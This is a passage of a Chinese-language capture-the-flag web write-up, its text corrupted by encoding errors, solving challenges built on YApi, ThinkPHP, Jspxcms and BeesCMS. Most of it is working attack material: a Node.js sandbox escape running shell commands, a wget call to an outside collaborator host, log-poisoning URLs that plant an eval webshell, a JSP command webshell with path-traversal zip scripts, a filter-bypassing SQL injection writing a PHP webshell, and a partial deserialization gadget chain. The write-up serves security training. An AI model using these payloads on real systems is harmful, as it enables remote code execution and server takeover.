&lt;li>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx&lt;/li>
&lt;li>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html&lt;/li>
&lt;li>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx/access.log&lt;/li>
&lt;/ul>
&lt;h2 id="ezrce">ezrce&lt;/h2>
&lt;blockquote>
&lt;p>ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ&lt;/p>
&lt;/blockquote>
&lt;p>æ˜¯ä¸€ä¸ªYAPIçš„ä¸»é¡µï¼Œæ ¹æ®é¢˜ç›®é‡Œrceçš„æç¤º æœæœçœ‹å·²çŸ¥çš„æ¼æ´ï¼š&lt;a href="https://blog.csdn.net/XavierDarkness/article/details/118662886">Yapi å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´&lt;/a>&lt;/p>
&lt;p>é‚£å°±å¥½åŠäº† è·Ÿç€æ¥å°±è¡Œå’¯ï¼›é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731153231688.png" alt="image-20210731153231688">&lt;/p>
&lt;p>ä¹‹åä¿®æ”¹å…¨å±€mockè„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">mockjson&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;command&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹åæ·»åŠ æ¥å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154705721.png" alt="image-20210731154705721">&lt;/p>
&lt;p>è„šæœ¬ä¸­çš„execSync()å¤„å¯rceï¼Œå…ˆç”¨&lt;code>wget http://xxxxx.burpcollaborator.net&lt;/code>è¯•è¯•æ°´&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154732738.png" alt="image-20210731154732738">&lt;/p>
&lt;p>å¾ˆé¡ºåˆ©å˜› å¥½è€¶ï¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // spawnSync /bin/sh ENOBUFS
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // config.json, init.lock, log, vendors
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var
&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat ffffffflllllaggggg&lt;span style="color:#d88200">`&lt;/span> // flag&lt;span style="color:#f92672">{&lt;/span>5d096f4f-8c32-49b6-bed4-b485eb1cf08b&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easythinkphp">easythinkphp&lt;/h2>
&lt;blockquote>
&lt;p>easythinkphp&lt;/p>
&lt;/blockquote>
&lt;p>åªæœ‰ä¸€ä¸ªthinkphp 3.2.3çš„æ¬¢è¿é¡µé¢ï¼Œtpçš„æ´å¾ˆå¤š å¯ä»¥ç›´æ¥æ‹¿æ¥æ‰“ï¼Œå‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">ã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
/index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
&lt;p>å…ˆéªŒè¯ä¸€ä¸‹æ–‡æ¡£ä¸­çš„æ–¹æ³•ï¼ŒæˆåŠŸï¼Œä¹‹åæŠŠphpinfoæ¢æˆè‡ªå·±çš„ä¸€å¥è¯æœ¨é©¬&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¼ å…¥å ç”¨èšå‰‘è¿æ¥å°±èƒ½æ‹¿flagäº†~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
&lt;p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>ä¸€æŠŠæ¢­ï¼ä¸€é”®getshell ä½ å€¼å¾—æ‹¥æœ‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803170035307.png" alt="image-20210803170035307">&lt;/p>
&lt;h2 id="jspxcms">jspxcms&lt;/h2>
&lt;p>ä¹Ÿæœ‰ç°æˆçš„æ´å¯ä»¥ç›´æ¥ç”¨ï¼Œå‚è€ƒï¼š&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">å¤ç°jspxcmsè§£å‹getshellæ¼æ´&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">ä»£ç å®¡è®¡| Jspxcmsæ–‡ä»¶ä¸Šä¼ æ¼æ´(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">è®°ä¸€æ¬¡ç”±è¿½è¸ªæº¯æºå‘ç°çš„â€œä¸å®‰å…¨è§£å‹getshellâ€&lt;/a>&lt;/p>
&lt;p>é¦–å…ˆæ„é€ å«jspğŸçš„æ¶æ„waråŒ…ï¼ŒğŸé•¿è¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);
while((a=in.read(b))!=-1){
out.println(new String(b));
}
out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
}
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¹‹åæ”¾å…¥ä¸€ä¸ªè§£å‹åä¼šè‡ªåŠ¨å®Œæˆç›®å½•ç©¿è¶Šçš„zipåŒ…ä¸­ è¿™ä¸ªè¿‡ç¨‹ç”±pyè„šæœ¬å®Œæˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">binary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;helloworld&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipInfo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../../../dog123.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">binary&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">IOError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test123.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../../../../wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ æœ€ç»ˆæˆ‘ä»¬è¦ç©¿è¶Šåˆ°çš„ç›®å½•æ˜¯ç½‘ç«™æ ¹ç›®å½•çš„ä¸Šå±‚ï¼Œå³webappsç›®å½•ä¸‹ ä¸ROOTç›®å½•åŒçº§ï¼Œå½“waråŒ…ä½äºè¿™ä¸ªç›®å½•ä¸‹æ‰ä¼šè‡ªåŠ¨éƒ¨ç½²&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801013622428.png" alt="image-20210801013622428">&lt;/p>
&lt;p>ç›´æ¥&lt;code>cat /flag&lt;/code>å°±å¥½å•¦&lt;/p>
&lt;h2 id="cybercms">cybercms&lt;/h2>
&lt;blockquote>
&lt;p>èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ&lt;/p>
&lt;p>Hintï¼šä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½&lt;/p>
&lt;/blockquote>
&lt;p>ä¸€ä¸ªï¼ˆä¼ªï¼‰cmså¹³å°ä»‹ç»çš„é¡µé¢ï¼Œæ¯”è¾ƒç®€é™‹ï¼Œé¦–é¡µ/åº”ç”¨æ¡ˆä¾‹å¤„æ˜¾ç¤ºhacked by ymnhï¼Œåœ¨ymnhçš„å’¨è¯¢é¡µé¢å¤„æœ‰è¿™æ ·çš„æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031306740.png" alt="image-20210801031306740">&lt;/p>
&lt;p>åœ¨é¦–é¡µ/æ–°é—»åŠ¨æ€å¤„ï¼Œå‡ ä¹æ‰€æœ‰çš„å¸–å­éƒ½æ˜¯hacked by xxx~~ï¼ˆæœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºæ˜¯å¤šä¹ˆå¤æ‚çš„é•¿ç¯‡å¤§è®ºï¼‰~~ï¼Œåœ¨å¦‚ä½•å®‰è£…å’Œä½¿ç”¨æ¨¡æ¿è¿™ç¯‡ä¸‹æœ‰æ²¡åˆ å¹²å‡€çš„ä¸œè¥¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031809386.png" alt="image-20210801031809386">&lt;/p>
&lt;p>å¦‚ä½•è®¾ç½®è¿›ç«™è¯­è¨€è¿™ç¯‡é‡Œç«Ÿç„¶æ˜¯è¿™æ ·çš„&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801032406665.png" alt="image-20210801032406665">&lt;/p>
&lt;p>è‰ çœŸæ˜¯èšŒåŸ ä½äº† å›¾ç©·åŒ•è§äº†å±äºæ˜¯2333333&lt;/p>
&lt;p>æ ¹æ®è¿™äº›ï¼Œå¯ä»¥å¾—çŸ¥æ•´ä¸ªç«™æ˜¯å®Œå…¨ç§»æ¤/å¥—å£³beescmsçš„ æ‰€ä»¥æ¥ç€å»æ‰¾å·²å­˜åœ¨çš„æ´ï¼Œå‚è€ƒï¼š&lt;a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 sqlæ³¨å…¥æ¼æ´åˆ†æ&lt;/a>&lt;/p>
&lt;p>åœ¨adminååŠ å•å¼•å·ï¼Œæç¤º&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
&lt;p>è¡¨åæ˜¯bees_adminï¼Œæœ‰id, admin_name, admin_password, admin_purview, is_disableå…±5ä¸ªå­—æ®µ&lt;/p>
&lt;p>ç®€å•fuzzå¯çŸ¥ï¼šè¿‡æ»¤äº†ç©ºæ ¼ï¼ˆç”¨&lt;code>/**/&lt;/code>ç»•è¿‡ï¼‰ï¼ˆæˆ–è€…ç”¨&lt;code>tab&lt;/code>ç»•è¿‡ æˆ–è€…&lt;code>%0a&lt;/code>ç»•è¿‡ éƒ½å¯ä»¥ï¼‰ï¼Œè¿‡æ»¤äº†select, outfileï¼ˆåŒå†™ç»•è¿‡ï¼‰ï¼Œå¯¹å°–æ‹¬å·è½¬ä¹‰ä¸ºhtmlå®ä½“ï¼ˆç”¨hexç»•è¿‡ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
&lt;p>å›æ˜¾æ­£å¸¸ï¼Œæ¥ç€å°è¯•å†™å…¥shellï¼ˆè¿™é‡Œè¦å†™æ¸…æ¥šç»å¯¹è·¯å¾„ï¼Œåœ¨ä¸Šé¢çš„ä¸€å¼ æŠ¥é”™çš„é¡µé¢ä¹Ÿæœ‰æ‰€æç¤ºäº†ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
&lt;p>å¥½è€¶ï¼Œè¿èšå‰‘æ‹¿flagå’¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
&lt;h2 id="ez_website">ez_website&lt;/h2>
&lt;blockquote>
&lt;p>ç®€å•çš„é¢˜ç›®&lt;/p>
&lt;/blockquote>
&lt;p>ä¹Ÿæ˜¯ç°å®ä¸–ç•Œå­˜åœ¨çš„ä¸œè¥¿ï¼Œå‚è€ƒï¼š&lt;a href="https://ma4ter.cn/2527.html">é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡&lt;/a>&lt;/p>
&lt;p>ç›´æ¥ç”¨å·²æœ‰çš„é“¾å­æ‰“&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\process\pipes&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Windows&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">//$file =&amp;gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±»
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;parent=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;getError&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//è°ƒç”¨getError è¿”å›this-&amp;gt;error
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $this-&amp;gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==&amp;gt;&amp;gt;HasOne
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Pivot&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">parent&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HasOne&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$selfRelation&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">selfRelation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$queryæŒ‡å‘Query
